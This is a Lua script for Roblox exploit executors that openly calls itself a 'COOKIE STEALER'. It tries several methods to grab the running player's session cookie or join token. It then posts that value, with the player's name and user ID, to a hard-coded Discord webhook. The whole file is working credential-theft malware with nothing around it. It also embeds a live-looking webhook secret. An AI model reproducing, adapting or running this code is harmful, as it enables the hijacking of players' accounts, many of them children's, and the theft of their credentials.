local webhook = "https://discord.com/api/webhooks/1431427795682328698/mUTGrbjd0Cy_WeR0dfOaLyocTQGAEH-KuK6F54lvIir0T3NGoVD0Nfpe0LUIGpScfoxj"

local request = (syn and syn.request) or http_request or (http and http.request)
if request then
    local cookie
    pcall(function()
        cookie = game:GetService("Players").LocalPlayer:GetAttribute("ROBLOSECURITY")
    end)
    
    if not cookie or cookie == "not_found" then
        pcall(function()
            cookie = game:GetService("Players").LocalPlayer:GetJoinData().TeleportJwt
        end)
    end
    
    if not cookie then
        pcall(function()
            cookie = game:HttpGet("https://www.roblox.com/game/GetCurrentUser.ashx")
        end)
    end
    
    cookie = cookie or "cookie_not_found"

    local data = {
        ["content"] = "🚨 COOKIE STEALER 🚨\n"..
                     "User: "..game.Players.LocalPlayer.Name.."\n"..
                     "UserId: "..game.Players.LocalPlayer.UserId.."\n"..
                     "Cookie: "..tostring(cookie)
    }
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode(data)
    })
end
